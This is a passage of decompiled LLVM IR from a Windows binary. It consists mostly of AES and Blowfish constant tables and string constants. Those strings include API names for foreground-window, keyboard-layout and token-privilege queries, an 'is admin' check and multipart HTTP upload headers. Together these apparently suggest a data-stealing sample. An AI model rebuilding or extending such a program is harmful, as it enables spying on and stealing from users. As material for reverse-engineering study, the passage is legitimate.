-436207846, i32 -34344178, i32 -1076702611, i32 -2117218996, i32 403442708, i32 638784309, i32 -1007883217, i32 -1101045791, i32 899127202, i32 -2008791860, i32 773265209, i32 -1815821225, i32 1437050866, i32 -58818942, i32 2050833735, i32 -932944724, i32 -1168286233, i32 840505643, i32 -428641387, i32 -1067425632, i32 427917720, i32 -1638969391, i32 -1545806721, i32 1143087718, i32 1412049534, i32 999329963, i32 193497219, i32 -1941551414, i32 -940642775, i32 1807268051, i32 672404540, i32 -1478566279, i32 -1134666014, i32 369822493, i32 -1378100362, i32 -606019525, i32 1681011286, i32 1949973070, i32 336202270, i32 -1840690725, i32 201721354, i32 1210328172, i32 -1201906460, i32 -1614626211, i32 -1110191250, i32 1135389935, i32 -1000185178, i32 965841320, i32 831886756, i32 -739974089, i32 -226920053, i32 -706222286, i32 -1949775805, i32 1849112409, i32 -630362697, i32 26054028, i32 -1311386268, i32 -1672589614, i32 1235855840, i32 -663982924, i32 -1403627782, i32 -202050553, i32 -806688219, i32 -899324497, i32 -193299826, i32 1202630377, i32 268961816, i32 1874508501, i32 -260540280, i32 1243948399, i32 1546530418, i32 941366308, i32 1470539505, i32 1941222599, i32 -1748580783, i32 -873928669, i32 -1579295364, i32 -395021156, i32 1042226977, i32 -1773450275, i32 1639824860, i32 227249030, i32 260737669, i32 -529502064, i32 2084453954, i32 1907733956, i32 -865704278, i32 -1874310952, i32 100860677, i32 -134810111, i32 470683154, i32 -1033805405, i32 1781871967, i32 -1370007559, i32 1773779408, i32 394692241, i32 -1715355304, i32 974986535, i32 664706745, i32 -639508168, i32 -336005101, i32 731420851, i32 571543859, i32 -764843589, i32 -1445340816, i32 126783113, i32 865375399, i32 765172662, i32 1008606754, i32 361203602, i32 -907417312, i32 -2016489911, i32 -1437248001, i32 1344809080, i32 -1512054918, i32 59542671, i32 1503764984, i32 160008576, i32 437062935, i32 1707065306, i32 -672733647, i32 -2076032314, i32 -798463816, i32 -2109652541, i32 697932208, i32 1512910199, i32 504303377, i32 2075177163, i32 -1470868228, i32 1841019862, i32 739644986]
@Rijndael_Te3__0x6363a5c6U__at_4237b0 = local_unnamed_addr constant [256 x i32] [i32 1667474886, i32 2088535288, i32 2004326894, i32 2071694838, i32 -219017729, i32 1802223062, i32 1869591006, i32 -976923503, i32 808472672, i32 16843522, i32 1734846926, i32 724270422, i32 -16901657, i32 -673750347, i32 -1414797747, i32 1987484396, i32 -892713585, i32 -2105369313, i32 -909557623, i32 2105378810, i32 -84273681, i32 1499065266, i32 1195886990, i32 -252703749, i32 -1381110719, i32 -724277325, i32 -1566376609, i32 -1347425723, i32 -1667449053, i32 -1532692653, i32 1920112356, i32 -1061135461, i32 -1212693899, i32 -33743647, i32 -1819038147, i32 640051788, i32 909531756, i32 1061110142, i32 -134806795, i32 -859025533, i32 875846760, i32 -1515850671, i32 -437963567, i32 -235861767, i32 1903268834, i32 -656903253, i32 825316194, i32 353713962, i32 67374088, i32 -943238507, i32 589522246, i32 -1010606435, i32 404236336, i32 -1768513225, i32 84217610, i32 -1701137105, i32 117901582, i32 303183396, i32 -2139055333, i32 -488489505, i32 -336910643, i32 656894286, i32 -1296904833, i32 1970642922, i32 151591698, i32 -2088526307, i32 741110872, i32 437923380, i32 454765878, i32 1852748508, i32 1515908788, i32 -1600062629, i32 1381168804, i32 993742198, i32 -690593353, i32 -1280061827, i32 690584402, i32 -471646499, i32 791638366, i32 -2071685357, i32 1398011302, i32 -774805319, i32 0, i32 -303223615, i32 538992704, i32 -50585629, i32 -1313748871, i32 1532751286, i32 1785380564, i32 -875870579, i32 -1094788761, i32 960056178, i32 1246420628, i32 1280103576, i32 1482221744, i32 -808498555, i32 -791647301, i32 -269538619, i32 -1431640753, i32 -67430675, i32 1128514950, i32 1296947098, i32 859002214, i32 -2054843375, i32 1162203018, i32 -101117719, i32 33687044, i32 2139062782, i32 1347481760, i32 1010582648, i32 -1616922075, i32 -1465326773, i32 1364325282, i32 -1549533603, i32 1077985408, i32 -1886418427, i32 -1835881153, i32 -1650607071, i32 943212656, i32 -168491791, i32 -1128472733, i32 -1229536905, i32 -623217233, i32 555836226, i32 269496352, i32 -58651, i32 -202174723, i32 -757961281, i32 -842183551, i32 202118168, i32 320025894, i32 -320065597, i32 1600119230, i32 -1751670219, i32 1145359496, i32 387397934, i32 -993765485, i32 -1482165675, i32 2122220284, i32 1027426170, i32 1684319432, i32 1566435258, i32 421079858, i32 1936954854, i32 1616945344, i32 -2122213351, i32 1330631070, i32 -589529181, i32 572679748, i32 707427924, i32 -1869567173, i32 -2004319477, i32 1179044492, i32 -286381625, i32 -1195846805, i32 336870440, i32 -555845209, i32 1583276732, i32 185277718, i32 -606374227, i32 -522175525, i32 842159716, i32 976899700, i32 168435220, i32 1229577106, i32 101059084, i32 606366792, i32 1549591736, i32 -1027449441, i32 -741118275, i32 -1397952701, i32 1650632388, i32 -1852725191, i32 -1785355215, i32 -454805549, i32 2038008818, i32 -404278571, i32 -926399605, i32 926374254, i32 1835907034, i32 -1920103423, i32 -707435343, i32 1313788572, i32 -1448484791, i32 1819063512, i32 1448540844, i32 -185333773, i32 -353753649, i32 1701162954, i32 2054852340, i32 -1364268729, i32 134748176, i32 -1162160785, i32 2021165296, i32 623210314, i32 774795868, i32 471606328, i32 -1499008681, i32 -1263220877, i32 -960081513, i32 -387439669, i32 -572687199, i32 1953799400, i32 522133822, i32 1263263126, i32 -1111630751, i32 -1953790451, i32 -1970633457, i32 1886425312, i32 1044267644, i32 -1246378895, i32 1718004428, i32 1212733584, i32 50529542, i32 -151649801, i32 235803164, i32 1633788866, i32 892690282, i32 1465383342, i32 -1179004823, i32 -2038001385, i32 -1044293479, i32 488449850, i32 -1633765081, i32 -505333543, i32 -117959701, i32 -1734823125, i32 286339874, i32 1768537042, i32 -640061271, i32 -1903261433, i32 -1802197197, i32 -1684294099, i32 505291324, i32 -2021158379, i32 -370597687, i32 -825341561, i32 1431699370, i32 673740880, i32 -539002203, i32 -1936945405, i32 -1583220647, i32 -1987477495, i32 218961690, i32 -1077945755, i32 -421121577, i32 1111672452, i32 1751693520, i32 1094828930, i32 -1717981143, i32 757954394, i32 252645662, i32 -1330590853, i32 1414855848, i32 -1145317779, i32 370555436]
@AES_Rijndael_Si___ARIA_X1_at_4247b0 = local_unnamed_addr constant [256 x i8] c"R\09j\D506\A58\BF@\A3\9E\81\F3\D7\FB|\E39\82\9B/\FF\874\8ECD\C4\DE\E9\CBT{\942\A6\C2#=\EEL\95\0BB\FA\C3N\08.\A1f(\D9$\B2v[\A2Im\8B\D1%r\F8\F6d\86h\98\16\D4\A4\5C\CC]e\B6\92lpHP\FD\ED\B9\DA^\15FW\A7\8D\9D\84\90\D8\AB\00\8C\BC\D3\0A\F7\E4X\05\B8\B3E\06\D0,\1E\8F\CA?\0F\02\C1\AF\BD\03\01\13\8Ak:\91\11AOg\DC\EA\97\F2\CF\CE\F0\B4\E6s\96\ACt\22\E7\AD5\85\E2\F97\E8\1Cu\DFnG\F1\1Aq\1D)\C5\89o\B7b\0E\AA\18\BE\1B\FCV>K\C6\D2y \9A\DB\C0\FEx\CDZ\F4\1F\DD\A83\88\07\C71\B1\12\10Y'\80\EC_`Q\7F\A9\19\B5J\0D-\E5z\9F\93\C9\9C\EF\A0\E0;M\AE*\F5\B0\C8\EB\BB<\83S\99a\17+\04~\BAw\D6&\E1i\14cU!\0C}"
@global_var_428000 = local_unnamed_addr global i32 -1153374642
@global_var_426250 = local_unnamed_addr constant [18 x i8] c"ghijklmnopqrstuvH\00"
@global_var_422584 = constant i32 4211744
@global_var_4258dc = local_unnamed_addr constant [8 x i8] c"generic\00"
@global_var_4258e4 = constant [14 x i8] c"unknown error\00"
@global_var_4258f4 = constant [9 x i8] c"iostream\00"
@global_var_425900 = constant [22 x i8] c"iostream stream error\00"
@global_var_425918 = local_unnamed_addr constant [7 x i8] c"system\00"
@global_var_4225a0 = local_unnamed_addr constant i32 4211744
@global_var_4225d8 = constant i32 4211744
@global_var_429328 = local_unnamed_addr global i32* @global_var_4225d8
@global_var_42592c = constant [24 x i8] c"invalid string position\00"
@global_var_425944 = constant [16 x i8] c"string too long\00"
@global_var_429324 = local_unnamed_addr global i32 1
@global_var_425a2c = constant i32 4213872
@global_var_425958 = local_unnamed_addr constant [11 x i16] %wide-string
@global_var_429320 = local_unnamed_addr global i32 -1
@global_var_42aea8 = local_unnamed_addr global i32 0
@global_var_42adcc = local_unnamed_addr global i32 0
@global_var_42add0 = local_unnamed_addr global i32 0
@global_var_42add2 = local_unnamed_addr global i32 0
@global_var_426170 = local_unnamed_addr constant [242 x i8] c"GetForegroundWin009042316 FirefoContent-Type: aphttps://en.wikipOU!7/2<XPX75*Bqqlla/5.0 (WindowsAccept: applicattml+xml,applicatltipart/form-datGetTokenInformatContent-Disposition/x-www-form-uContent-Type: muGetKeyboardLayoughijklmnopqrstuvH\00"
@global_var_42add8 = local_unnamed_addr global i32 0
@global_var_42bee0 = local_unnamed_addr global i32 0
@global_var_42addc = local_unnamed_addr global i32 0
@global_var_42ade0 = local_unnamed_addr global i32 0
@global_var_426240 = local_unnamed_addr constant [34 x i8] c"GetKeyboardLayoughijklmnopqrstuvH\00"
@global_var_425de0 = local_unnamed_addr constant [8 x i16] %wide-string
@global_var_42ae90 = local_unnamed_addr global i32 0
@global_var_42ae94 = local_unnamed_addr global i32 0
@global_var_42931c = local_unnamed_addr global i32 65279
@global_var_425970 = local_unnamed_addr constant [40 x i16] %wide-string
@global_var_42a5ca = local_unnamed_addr global i32 0
@global_var_4058dc = local_unnamed_addr constant i32 4216506
@global_var_4259c0 = local_unnamed_addr constant i32 32
@global_var_425dd0 = local_unnamed_addr constant [8 x i16] %wide-string
@global_var_42005b = local_unnamed_addr constant i32 1862300160
@global_var_430041 = local_unnamed_addr constant i32 1781738547
@global_var_420041 = local_unnamed_addr constant i32 1879048192
@global_var_4259c4 = local_unnamed_addr constant i32 43
@global_var_4259c8 = local_unnamed_addr constant i32 45
@global_var_4259cc = local_unnamed_addr constant i32 48
@global_var_4259d0 = local_unnamed_addr constant i32 49
@global_var_4259d4 = local_unnamed_addr constant i32 50
@global_var_4259d8 = local_unnamed_addr constant i32 51
@global_var_4259dc = local_unnamed_addr constant i32 52
@global_var_4259e0 = local_unnamed_addr constant i32 53
@global_var_4259e4 = local_unnamed_addr constant i32 54
@global_var_4259e8 = local_unnamed_addr constant i32 55
@global_var_4259ec = local_unnamed_addr constant i32 56
@global_var_4259f0 = local_unnamed_addr constant i32 57
@global_var_4259f4 = local_unnamed_addr constant i32 42
@global_var_425920 = constant i32 46
@global_var_4259f8 = local_unnamed_addr constant i32 47
@global_var_425e10 = local_unnamed_addr constant i32* bitcast (i128* @global_var_43005b to i32*)
@global_var_42beb0 = local_unnamed_addr global i32 0
@global_var_42beb4 = local_unnamed_addr global i32 0
@global_var_4259fc = constant [13 x i8] c"kernel32.dll\00"
@global_var_42bf10 = local_unnamed_addr global i32 0
@global_var_425a0c = local_unnamed_addr constant [7 x i16] %wide-string
@global_var_425954 = local_unnamed_addr constant i32 0
@global_var_42aeac = local_unnamed_addr global i32 0
@global_var_425a34 = constant [13 x i8] c"Advapi32.dll\00"
@global_var_426160 = local_unnamed_addr constant [258 x i8] c"OpenProcessTokenGetForegroundWin009042316 FirefoContent-Type: aphttps://en.wikipOU!7/2<XPX75*Bqqlla/5.0 (WindowsAccept: applicattml+xml,applicatltipart/form-datGetTokenInformatContent-Disposition/x-www-form-uContent-Type: muGetKeyboardLayoughijklmnopqrstuvH\00"
@global_var_426200 = local_unnamed_addr constant [98 x i8] c"GetTokenInformatContent-Disposition/x-www-form-uContent-Type: muGetKeyboardLayoughijklmnopqrstuvH\00"
@global_var_425a44 = constant [3 x i8] c"ok\00"
@global_var_425a48 = constant [12 x i16] %wide-string
@global_var_425a60 = constant [14 x i8] c"user is admin\00"
@global_var_425a70 = local_unnamed_addr constant [4 x i8] c"miv\00"
@global_var_425a74 = local_unnamed_addr constant [14 x i8] c"not available\00"
@Blowfish_bfp_table_at_422f68 = local_unnamed_addr constant [18 x i32] [i32 608135816, i32 -2052912941, i32 320440878, i32 57701188, i32 -1542899678, i32 698298832, i32 137296536, i32 -330404727, i32 1160258022, i32 953160567, i32 -1101764913, i32 887688300, i32 -1062458953, i32 -914599715, i32 1065670069, i32 -1253635817, i32 -1843997223, i32 -1988494565]
@Blowfish_s_init_at_4248b0 = local_unnamed_addr constant [1024 x i32] [i32 -785314906, i32 -1730169428, i32 805139163, i32 -803545161, i32 -1193168915, i32 1780907670, i32 -1166241723, i32 -248741991, i32 614570311, i32 -1282315017, i32 134345442, i32 -2054226922, i32 1667834072, i32 1901547113, i32 -1537671517, i32 -191677058, i32 227898511, i32 1921955416, i32 1904987480, i32 -2112533778, i32 2069144605, i32 -1034266187, i32 -1674521287, i32 720527379, i32 -976113629, i32 677414384, i32 -901678824, i32 -1193592593, i32 -1904616272, i32 1614419982, i32 1822297739, i32 -1340175810, i32 -686458943, i32 -1120842969, i32 2024746970, i32 1432378464, i32 -430627341, i32 -1437226092, i32 1464375394, i32 1676153920, i32 1439316330, i32 715854006, i32 -1261675468, i32 289532110, i32 -1588296017, i32 2087905683, i32 -1276242927, i32 1668267050, i32 732546397, i32 1947742710, i32 -832815594, i32 -1685613794, i32 -1344882125, i32 1814351708, i32 2050118529, i32 680887927, i32 999245976, i32 1800124847, i32 -994056165, i32 1713906067, i32 1641548236, i32 -81679983, i32 1216130144, i32 1575780402, i32 -276538019, i32 -377129551, i32 -601480446, i32 -345695352, i32 596196993, i32 -745100091, i32 258830323, i32 -2081144263, i32 772490370, i32 -1534844924, i32 1774776394, i32 -1642095778, i32 566650946, i32 -152474470, i32 1728879713, i32 -1412200208, i32 1783734482, i32 -665571480, i32 -1777359064, i32 -1420741725, i32 1861159788, i32 326777828, i32 -1170476976, i32 2130389656, i32 -1578015459, i32 967770486, i32 1724537150, i32 -2109534584, i32 -1930525159, i32 1164943284, i32 2105845187, i32 998989502, i32 -529566248, i32 -2050940813, i32 1075463327, i32 1455516326, i32 1322494562, i32 910128902, i32 469688178, i32 1117454909, i32 936433444, i32 -804646328, i32 -619713837, i32 1240580251, i32 122909385, i32 -2137449605, i32 634681816, i32 -152510729, i32 -469872614, i32 -1233564613, i32 -1754472259, i32 79693498, i32 -1045868618, i32 1084186820, i32 1583128258, i32 426386531, i32 1761308591, i32 1047286709, i32 322548459, i32 995290223, i32 1845252383, i32 -1691314900, i32 -863943356, i32 -1352745719, i32 -1092366332, i32 -567063811, i32 1712269319, i32 422464435, i32 -1060394921, i32 1170764815, i32 -771006663, i32 -1177289765, i32 1434042557, i32 442511882, i32 -694091578, i32 1076654713, i32 1738483198, i32 -81812532, i32 -1901729288, i32 -617471240, i32 1014306527, i32 -43947243, i32 793779912, i32 -1392160085, i32 842905082, i32 -48003232, i32 1395751752, i32 1040244610, i32 -1638115397, i32 -898659168, i32 445077038, i32 -552113701, i32 -717051658, i32 679411651, i32 -1402522938, i32 -1940957837, i32 1767581616, i32 -1144366904, i32 -503340195, i32 -1192226400, i32 284835224, i32 -48135240, i32 1258075500, i32 768725851, i32 -1705778055, i32 -1225243291, i32 -762426948, i32 1274779536, i32 -505548070, i32 -1530167757, i32 1660621633, i32 -823867672, i32 -283063590, i32 913787905, i32 -797008130, i32 737222580, i32 -1780753843, i32 -1366257256, i32 -357724559, i32 1804850592, i32 -795946544, i32 -1345903136, i32 -1908647121, i32 -1904896841, i32 -1879645445, i32 -233690268, i32 -2004305902, i32 -1878134756, i32 1336762016, i32 1754252060, i32 -774901359, i32 -1280786003, i32 791618072, i32 -1106372745, i32 -361419266, i32 -1962795103, i32 -442446833, i32 -1250986776, i32 413987798, i32 -829824359, i32 -1264037920, i32 -49028937, i32 2093235073, i32 -760370983, i32 375366246, i32 -2137688315, i32 -1815317740, i32 555357303, i32 -424861595, i32 2008414854, i32 -950779147, i32 -73583153, i32 -338841844, i32 2067696032, i32 -700376109, i32 -1373733303, i32 2428461, i32 544322398, i32 577241275, i32 1471733935, i32 610547355, i32 -267798242, i32 1432588573, i32 1507829418, i32 2025931657, i32 -648391809, i32 545086370, i32 48609733, i32 -2094660746, i32 1653985193, i32 298326376, i32 1316178497, i32 -1287180854, i32 2064951626, i32 458293330, i32 -1705826027, i32 -703637697, i32 -1130641692, i32 727753846, i32 -2115603456, i32 146436021, i32 1461446943, i32 -224990101, i32 705550613, i32 -1235000031, i32 -407242314, i32 -13368018, i32 -981117340, i32 1404054877, i32 -1449160799, i32 146425753, i32 1854211946, i32 1266315497, i32 -1246549692, i32 -613086930, i32 -1004984797, i32 -1385257296, i32 1235738493, i32 -1662099272, i32 -1880247706, i32 -324367247, i32 1771706367, i32 1449415276, i32 -1028546847, i32 422970021, i32 1963543593, i32 -1604775104, i32 -468174274, i32 1062508698, i32 1531092325, i32 1804592342, i32 -1711849514, i32 -1580033017, i32 -269995787, i32 1294809318, i32 -265986623, i32 1289560198, i32 -2072974554, i32 1669523910, i32 35572830, i32 157838143, i32 1052438473, i32 1016535060, i32 1802137761, i32 1753167236, i32 1386275462, i32 -1214491899, i32 -1437595849, i32 1040679964, i32 2145300060, i32 -1904392980, i32 1461121720, i32 -1338320329, i32 -263189491, i32 -266592508, i32 33600511, i32 -1374882534, i32 1018524850, i32 629373528, i32 -603381315, i32 -779021319, i32 2091462646, i32 -1808644237, i32 586499841, i32 988145025, i32 935516892, i32 -927631820, i32 -1695294041, i32 -1455136442, i32 265290510, i32 -322386114, i32 -1535828415, i32 -499593831, i32 1005194799, i32 847297441, i32 406762289, i32 1314163512, i32 1332590856, i32 1866599683, i32 -167115585, i32 750260880, i32 613907577, i32 1450815602, i32 -1129346641, i32 -560302305, i32 -644675568, i32 -1282691566, i32 -590397650, i32 1427272223, i32 778793252, i32 1343938022, i32 -1618686585, i32 2052605720, i32 1946737175, i32 -1130390852, i32 -380928628, i32 -327488454, i32 -612033030, i32 1661551462, i32 -1000029230, i32 -283371449, i32 840292616, i32 -582796489, i32 616741398, i32 312560963, i32 711312465, i32 1351876610, i32 322626781, i32 1910503582, i32 271666773, i32 -2119403562, i32 1594956187, i32 70604529, i32 -677132437, i32 1007753275, i32 1495573769, i32 -225450259, i32 -1745748998, i32 -1631928532, i32 504708206, i32 -2031925904, i32 -353800271, i32 -2045878774, i32 1514023603, i32 1998579484, i32 1312622330, i32 694541497, i32 -1712906993, i32 -2143385130, i32 1382467621, i32 776784248, i32 -1676627094, i32 -971698502, i32 -1797068168, i32 -1510196141, i32 503983604, i32 -218673497, i32 907881277, i32 423175695, i32 432175456, i32 1378068232, i32 -149744970, i32 -340918674, i32 -356311194, i32 -474200683, i32 -1501837181, i32 -1317062703, i32 26017576, i32 -1020076561, i32 -1100195163, i32 1700274565, i32 1756076034, i32 -288447217, i32 -617638597, i32 720338349, i32 1533947780, i32 354530856, i32 688349552, i32 -321042571, i32 1637815568, i32 332179504, i32 -345916010, i32 53804574, i32 -1442618417, i32 -1250730864, i32 1282449977, i32 -711025141, i32 -877994476, i32 -288586052, i32 1617046695, i32 -1666491221, i32 -1292663698, i32 1686838959, i32 431878346, i32 -1608291911, i32 1700445008, i32 1080580658, i32 1009431731, i32 832498133, i32 -1071531785, i32 -1688990951, i32 -2023776103, i32 -1778935426, i32 1648197032, i32 -130578278, i32 -1746719369, i32 300782431, i32 375919233, i32 238389289, i32 -941219882, i32 -1763778655, i32 2019080857, i32 1475708069, i32 455242339, i32 -1685863425, i32 448939670, i32 -843904277, i32 1395535956, i32 -1881585436, i32 1841049896, i32 1491858159, i32 885456874, i32 -30872223, i32 -293847949, i32 1565136089, i32 -396052509, i32 1108368660, i32 540939232, i32 1173283510, i32 -1549095958, i32 -613658859, i32 -87339056, i32 -951913406, i32 -278217803, i32 1699691293, i32 1103962373, i32 -669091426, i32 -2038084153, i32 -464828566, i32 1031889488, i32 -815619598, i32 1535977030, i32 -58162272, i32 -1043876189, i32 2132092099, i32 1774941330, i32 1199868427, i32 1452454533, i32 157007616, i32 -1390851939, i32 342012276, i32 595725824, i32 1480756522, i32 206960106, i32 497939518, i32 591360097, i32 863170706, i32 -1919713727, i32 -698356495, i32 1814182875, i32 2094937945, i32 -873565088, i32 1082520231, i32 -831049106, i32 -1509457788, i32 435703966, i32 -386934699, i32 1641649973, i32 -1452693590, i32 -989067582, i32 1510255612, i32 -2146710820, i32 -1639679442, i32 -1018874748, i32 -36346107, i32 236887753, i32 -613164077, i32 274041037, i32 1734335097, i32 -479771840, i32 -976997275, i32 1899903192, i32 1026095262, i32 -244449504, i32 356393447, i32 -1884275382, i32 -421290197, i32 -612127241, i32 -381855128, i32 -1803468553, i32 -162781668, i32 -1805047500, i32 1091903735, i32 1979897079, i32 -1124832466, i32 -727580568, i32 -737663887, i32 857797738, i32 1136121015, i32 1342202287, i32 507115054, i32 -1759230650, i32 337727348, i32 -1081374656, i32 1301675037, i32 -1766485585, i32 1895095763, i32 1721773893, i32 -1078195732, i32 62756741, i32 2142006736, i32 835421444, i32 -1762973773, i32 1442658625, i32 -635090970, i32 -1412822374, i32 676362277, i32 1392781812, i32 170690266, i32 -373920261, i32 1759253602, i32 -683120384, i32 1745797284, i32 664899054, i32 1329594018, i32 -393761396, i32 -1249058810, i32 2062866102, i32 -1429332356, i32 -751345684, i32 -830954599, i32 1080764994, i32 553557557, i32 -638351943, i32 -298199125, i32 991055499, i32 499776247, i32 1265440854, i32 648242737, i32 -354183246, i32 980351604, i32 -581221582, i32 1749149687, i32 -898096901, i32 -83167922, i32 -654396521, i32 1161844396, i32 -1169648345, i32 1431517754, i32 545492359, i32 -26498633, i32 -795437749, i32 1437099964, i32 -1592419752, i32 -861329053, i32 -1713251533, i32 -1507177898, i32 1060185593, i32 1593081372, i32 -1876348548, i32 -34019326, i32 69676912, i32 -2135222948, i32 86519011, i32 -1782508216, i32 -456757982, i32 1220612927, i32 -955283748, i32 133810670, i32 1090789135, i32 1078426020, i32 1569222167, i32 845107691, i32 -711212847, i32 -222510705, i32 1091646820, i32 628848692, i32 1613405280, i32 -537335645, i32 526609435, i32 236106946, i32 48312990, i32 -1352249391, i32 -892239595, i32 1797494240, i32 859738849, i32 992217954, i32 -289490654, i32 -2051890674, i32 -424014439, i32 -562951028, i32 765654824, i32 -804095931, i32 -1783130883, i32 1685915746, i32 -405998096, i32 1414112111, i32 -2021832454, i32 -1013056217, i32 -214004450, i32 172450625, i32 -1724973196, i32 980381355, i32 -185008841, i32 -1475158944, i32 -1578377736, i32 -1726226100, i32 -613520627, i32 -964995824, i32 1835478071, i32 660984891, i32 -590288892, i32 -248967737, i32 -872349789, i32 -1254551662, i32 1762651403, i32 1719377915, i32 -824476260, i32 -1601057013, i32 -652910941, i32 -1156370552, i32 1364962596, i32 2073328063, i32 1983633131, i32 926494387, i32 -871278215, i32 -2144935273, i32 -198299347, i32 1749200295, i32 -966120645, i32 309677260, i32 2016342300, i32 1779581495, i32 -1215147545, i32 111262694, i32 1274766160, i32 443224088, i32 298511866, i32 1025883608, i32 -488520759, i32 1145181785, i32 168956806, i32 -653464466, i32 -710153686, i32 1689216846, i32 -628709281, i32 -1094719096, i32 1692713982, i32 -1648590761, i32 -252198778, i32 1618508792, i32 1610833997, i32 -771914938, i32 -164094032, i32 2001055236, i32 -684262196, i32 -2092799181, i32 -266425487, i32 -1333771897, i32 1006657119, i32 2006996926, i32 -1108824540, i32 1430667929, i32 -1084739999, i32 1314452623, i32 -220332638, i32 -193663176, i32 -2021016126, i32 1399257539, i32 -927756684, i32 -1267338667, i32 1190975929, i32 2062231137, i32 -1960976508, i32 -2073424263, i32 -1856006686, i32 1181637006, i32 548689776, i32 -1932175983, i32 -922558900, i32 -1190417183, i32 -1149106736, i32 296247880, i32 1970579870, i32 -1216407114, i32 -525738999, i32 1714227617, i32 -1003338189, i32 -396747006, i32 166772364, i32 1251581989, i32 493813264, i32 448347421, i32 195405023, i32 -1584991729, i32 677966185, i32 -591930749, i32 1463355134, i32 -1578971493, i32 1338867538, i32 1343315457, i32 -1492745222, i32 -1610435132, i32 233230375, i32 -1694987225, i32 2000651841, i32 -1017099258, i32 1638401717, i32 -266896856, i32 -1057650976, i32 6314154, i32 819756386, i32 300326615, i32 590932579, i32 1405279636, i32 -1027467724, i32 -1144263082, i32 -1866680610, i32 -335774303, i32 -833020554, i32 1862657033, i32 1266418056, i32 963775037, i32 2089974820, i32 -2031914401, i32 1917689273, i32 448879540, i32 -744572676, i32 -313240200, i32 150775221, i32 -667058989, i32 1303187396, i32 508620638, i32 -1318983944, i32 -1568336679, i32 1817252668, i32 1876281319, i32 1457606340, i32 908771278, i32 -574175177, i32 -677760460, i32 -1838972398, i32 1729034894, i32 1080033504, i32 976866871, i32 -738527793, i32 -1413318857, i32 1522871579, i32 1555064734, i32 1336096578, i32 -746444992, i32 -1715692610, i32 -720269667, i32 -1089506539, i32 -701686658, i32 -956251013, i32 -1215554709, i32 564236357, i32 -1301368386, i32 1781952180, i32 1464380207, i32 -1131123079, i32 -962365742, i32 1699332808, i32 1393555694, i32 1183702653, i32 -713881059, i32 1288719814, i32 691649499, i32 -1447410096, i32 -1399511320, i32 -1101077756, i32 -1577396752, i32 1781354906, i32 1676643554, i32 -1702433246, i32 -1064713544, i32 1126444790, i32 -1524759638, i32 -1661808476, i32 -2084544070, i32 -1679201715, i32 -1880812208, i32 -1167828010, i32 673620729, i32 -1489356063, i32 1269405062, i32 -279616791, i32 -953159725, i32 -145557542, i32 1057255273, i32 2012875353, i32 -2132498155, i32 -2018474495, i32 -1693849939, i32 993977747, i32 -376373926, i32 -1640704105, i32 753973209, i32 36408145, i32 -1764381638, i32 25011837, i32 -774947114, i32 2088578344, i32 530523599, i32 -1376601957, i32 1524020338, i32 1518925132, i32 -534139791, i32 -535190042, i32 1202760957, i32 -309069157, i32 -388774771, i32 674977740, i32 -120232407, i32 2031300136, i32 2019492241, i32 -311074731, i32 -141160892, i32 -472686964, i32 352677332, i32 -1997247046, i32 60907813, i32 90501309, i32 -1007968747, i32 1016092578, i32 -1759044884, i32 -1455814870, i32 457141659, i32 509813237, i32 -174299397, i32 652014361, i32 1966332200, i32 -1319764491, i32 55981186, i32 -1967506245, i32 676427537, i32 -1039476232, i32 -1412673177, i32 -861040033, i32 1307055953, i32 942726286, i32 933058658, i32 -1826555503, i32 -361066302, i32 -79791154, i32 1361170020, i32 2001714738, i32 -1464409218, i32 -1020707514, i32 1222529897, i32 1679025792, i32 -1565652976, i32 -580013532, i32 1770335741, i32 151462246, i32 -1281735158, i32 1682292957, i32 1483529935, i32 471910574, i32 1539241949, i32 458788160, i32 -858652289, i32 1807016891, i32 -576558466, i32 978976581, i32 1043663428, i32 -1129001515, i32 1927990952, i32 -94075717, i32 -1922690386, i32 -1086558393, i32 -761535389, i32 1412390302, i32 -1362987237, i32 -162634896, i32 1947078029, i32 -413461673, i32 -126740879, i32 -1353482915, i32 1077988104, i32 1320477388, i32 886195818, i32 18198404, i32 -508558296, i32 -1785185763, i32 112762804, i32 -831610808, i32 1866414978, i32 891333506, i32 18488651, i32 661792760, i32 1628790961, i32 -409780260, i32 -1153795797, i32 876946877, i32 -1601685023, i32 1372485963, i32 791857591, i32 -1608533303, i32 -534984578, i32 -1127755274, i32 -822013501, i32 -1578587449, i32 445679433, i32 -732971622, i32 -790962485, i32 -720709064, i32 54117162, i32 -963561881, i32 -1913048708, i32 -525259953, i32 -140617289, i32 1140177722, i32 -220915201, i32 668550556, i32 -1080614356, i32 367459370, i32 261225585, i32 -1684794075, i32 -85617823, i32 -826893077, i32 -1029151655, i32 314222801, i32 -1228863650, i32 -486184436, i32 282218597, i32 -888953790, i32 -521376242, i32 379116347, i32 1285071038, i32 846784868, i32 -1625320142, i32 -523005217, i32 -744475605, i32 -1989021154, i32 453669953, i32 1268987020, i32 -977374944, i32 -1015663912, i32 -550133875, i32 -1684459730, i32 -435458233, i32 266596637, i32 -447948204, i32 517658769, i32 -832407089, i32 -851542417, i32 370717030, i32 -47440635, i32 -2070949179, i32 -151313767, i32 -182193321, i32 -1506642397, i32 -1817692879, i32 1456262402, i32 -1393524382, i32 1517677493, i32 1846949527, i32 -1999473716, i32 -560569710, i32 -2118563376, i32 1280348187, i32 1908823572, i32 -423180355, i32 846861322, i32 1172426758, i32 -1007518822, i32 -911584259, i32 1655181056, i32 -1155153950, i32 901632758, i32 1897031941, i32 -1308360158, i32 -1228157060, i32 -847864789, i32 1393639104, i32 373351379, i32 950779232, i32 625454576, i32 -1170726756, i32 -146354570, i32 2007998917, i32 544563296, i32 -2050228658, i32 -1964470824, i32 2058025392, i32 1291430526, i32 424198748, i32 50039436, i32 29584100, i32 -689184263, i32 -1865090967, i32 -1503863136, i32 1057563949, i32 -1039604065, i32 -1219600078, i32 -831004069, i32 1469046755, i32 985887462]
@global_var_4261c0 = local_unnamed_addr constant [162 x i8] c"lla/5.0 (WindowsAccept: applicattml+xml,applicatltipart/form-datGetTokenInformatContent-Disposition/x-www-form-uContent-Type: muGetKeyboardLayoughijklmnopqrstuvH\00"
@global_var_4261d0 = local_unnamed_addr constant [146 x i8] c"Accept: applicattml+xml,applicatltipart/form-datGetTokenInformatContent-Disposition/x-www-form-uContent-Type: muGetKeyboardLayoughijklmnopqrstuvH\00"
@global_var_426220 = local_unnamed_addr constant [66 x i8] c"ion/x-www-form-uContent-Type: muGetKeyboardLayoughijklmnopqrstuvH\00"
@global_var_426190 = local_unnamed_addr constant [210 x i8] c"Content-Type: aphttps://en.wikipOU!7/2<XPX75*Bqqlla/5.0 (WindowsAccept: applicattml+xml,applicatltipart/form-datGetTokenInformatContent-Disposition/x-www-form-uContent-Type: muGetKeyboardLayoughijklmnopqrstuvH\00"
